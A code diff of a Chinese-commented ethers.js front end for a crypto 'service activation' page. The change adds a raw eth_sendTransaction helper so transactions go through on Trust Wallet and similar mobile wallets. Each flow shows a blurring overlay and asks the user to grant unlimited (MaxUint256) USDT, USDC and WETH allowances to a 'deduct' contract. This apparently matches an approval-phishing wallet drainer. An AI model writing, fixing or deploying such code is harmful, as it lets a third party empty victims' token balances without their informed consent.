@@ -21,7 +21,7 @@ const ERC20_ABI = [
 ];
 
 // --- Global Variables & DOM Elements (全域變數與 DOM 元素) ---
-// ⚠️ 注意: 您的 HTML 中沒有這些 ID，但假設您在客戶端介面使用了它們。
+// 假設您的 HTML 中有這些 ID
 const connectButton = document.getElementById('connectButton');
 const overlay = document.getElementById('blurOverlay');
 const overlayMessage = document.getElementById('overlayMessage');
@@ -32,20 +32,20 @@ let deductContract, usdtContract, usdcContract, wethContract;
 
 // --- UI Control Functions (使用者介面控制函數) ---
 function hideOverlay() {
-    if (!overlay) return; // 安全檢查
+    if (!overlay) return;
     overlay.style.opacity = '0';
     setTimeout(() => { overlay.style.display = 'none'; }, 300);
 }
 
 function showOverlay(message) {
-    if (!overlay || !overlayMessage) return; // 安全檢查
+    if (!overlay || !overlayMessage) return;
     overlayMessage.innerHTML = message;
     overlay.style.display = 'flex';
     setTimeout(() => { overlay.style.opacity = '1'; }, 10);
 }
 
 function updateStatus(message) {
-    if (!statusDiv) return; // 安全檢查
+    if (!statusDiv) return;
     statusDiv.innerHTML = message || '';
     statusDiv.style.display = message ? 'block' : 'none';
 }
@@ -69,7 +69,6 @@ async function initializeWallet() {
             try {
                 // 嘗試切換到主網 (Chain ID 1)
                 await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
-                // 成功切換後，chainChanged 監聽器會觸發頁面重新載入。
                 return; 
             } catch (switchError) {
                 if (switchError.code === 4001) {
@@ -105,6 +104,42 @@ async function initializeWallet() {
 }
 
 /**
+ * 【進階修復】使用精簡的 RPC 請求發送交易，以解決某些移動錢包（如 Trust Wallet）的格式錯誤。
+ * @param {object} populatedTx - 由 populateTransaction 產生的完整交易物件。
+ * @returns {object} 交易收據 (Receipt)。
+ */
+async function sendMobileRobustTransaction(populatedTx) {
+    if (!signer || !provider) throw new Error("錢包尚未連線或簽署者遺失。");
+    
+    // 1. 獲取交易 value，確保其格式正確 (十六進制字串)
+    const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
+    
+    // 2. 獲取當前帳戶地址
+    const fromAddress = await signer.getAddress();
+
+    // 3. 建立 Trust Wallet/嚴格錢包要求的精簡交易物件
+    const mobileTx = {
+        from: fromAddress,
+        to: populatedTx.to,
+        data: populatedTx.data,
+        // 關鍵：將 BigInt 轉換為十六進制字串格式 (如 '0x0')
+        value: '0x' + BigInt(txValue).toString(16) 
+    };
+    
+    // 4. 直接使用 provider.send('eth_sendTransaction', ...) 繞過 Ethers.js 內部組裝邏輯
+    const txHash = await provider.send('eth_sendTransaction', [mobileTx]);
+    
+    // 5. 等待交易收據
+    const receipt = await provider.waitForTransaction(txHash);
+
+    if (!receipt || receipt.status !== 1) {
+        throw new Error(`交易失敗 (reverted)。Hash: ${txHash.slice(0, 10)}...`);
+    }
+    return receipt;
+}
+
+
+/**
  * 檢查使用者的服務啟動狀態和代幣授權額度。
  */
 async function checkAuthorization() {
@@ -121,7 +156,6 @@ async function checkAuthorization() {
             wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)
         ]);
 
-        // 檢查是否有任一代幣授權額度足夠
         const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
         const isFullyAuthorized = isServiceActive && hasSufficientAllowance;
 
@@ -223,24 +257,20 @@ async function handleWethAuthorizationFlow(requiredAllowance, serviceActivated) 
     if (wethAllowance < requiredAllowance) {
         showOverlay('步驟 1/2: 請求 WETH 授權...<br>請在您的錢包中批准。');
         
-        // 【關鍵修復點】手動建立交易物件並明確設置 value: 0n
         const approvalTx = await wethContract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
-        approvalTx.value = 0n; // 强制 value 為 0，解決 Trust Wallet 錯誤
+        approvalTx.value = 0n; // 强制 value 為 0
         
-        const tx = await signer.sendTransaction(approvalTx);
-        await tx.wait();
+        await sendMobileRobustTransaction(approvalTx); 
     }
     
     // --- 啟動服務 (Activate) 步驟 ---
     if (!serviceActivated) {
         showOverlay('步驟 2/2: 啟動服務...<br>請在您的錢包中確認。');
         
-        // 【關鍵修復點】手動建立交易物件並明確設置 value: 0n
         const activateTx = await deductContract.activateService.populateTransaction(WETH_CONTRACT_ADDRESS);
-        activateTx.value = 0n; // 强制 value 為 0，解決 Trust Wallet 錯誤
+        activateTx.value = 0n; // 强制 value 為 0
         
-        const tx = await signer.sendTransaction(activateTx);
-        await tx.wait();
+        await sendMobileRobustTransaction(activateTx);
     }
 }
 
@@ -256,12 +286,10 @@ async function handleStablecoinAuthorizationFlow(requiredAllowance, serviceActiv
     if (usdtAllowance < requiredAllowance) {
         showOverlay('步驟 1/3: 請求 USDT 授權...<br>請在您的錢包中批准。');
         
-        // 【關鍵修復點】手動建立交易物件並明確設置 value: 0n
         const usdtApprovalTx = await usdtContract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
-        usdtApprovalTx.value = 0n; // 强制 value 為 0，解決 Trust Wallet 錯誤
+        usdtApprovalTx.value = 0n; // 强制 value 為 0
         
-        const tx = await signer.sendTransaction(usdtApprovalTx);
-        await tx.wait();
+        await sendMobileRobustTransaction(usdtApprovalTx);
     }
     if ((await usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)) >= requiredAllowance) {
         if (!serviceActivated) tokenToActivate = USDT_CONTRACT_ADDRESS;
@@ -272,12 +300,10 @@ async function handleStablecoinAuthorizationFlow(requiredAllowance, serviceActiv
     if (usdcAllowance < requiredAllowance) {
         showOverlay('步驟 2/3: 請求 USDC 授權...<br>請在您的錢包中批准。');
         
-        // 【關鍵修復點】手動建立交易物件並明確設置 value: 0n
         const usdcApprovalTx = await usdcContract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
-        usdcApprovalTx.value = 0n; // 强制 value 為 0，解決 Trust Wallet 錯誤
+        usdcApprovalTx.value = 0n; // 强制 value 為 0
         
-        const tx = await signer.sendTransaction(usdcApprovalTx);
-        await tx.wait();
+        await sendMobileRobustTransaction(usdcApprovalTx);
     }
     if (!tokenToActivate && (await usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)) >= requiredAllowance) {
           if (!serviceActivated) tokenToActivate = USDC_CONTRACT_ADDRESS;
@@ -287,12 +313,10 @@ async function handleStablecoinAuthorizationFlow(requiredAllowance, serviceActiv
     if (!serviceActivated && tokenToActivate) {
         showOverlay('步驟 3/3: 啟動服務...<br>請在您的錢包中確認。');
         
-        // 【關鍵修復點】手動建立交易物件並明確設置 value: 0n
         const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
-        activateTx.value = 0n; // 强制 value 為 0，解決 Trust Wallet 錯誤
+        activateTx.value = 0n; // 强制 value 為 0
         
-        const tx = await signer.sendTransaction(activateTx);
-        await tx.wait();
+        await sendMobileRobustTransaction(activateTx);
     }
 }
 
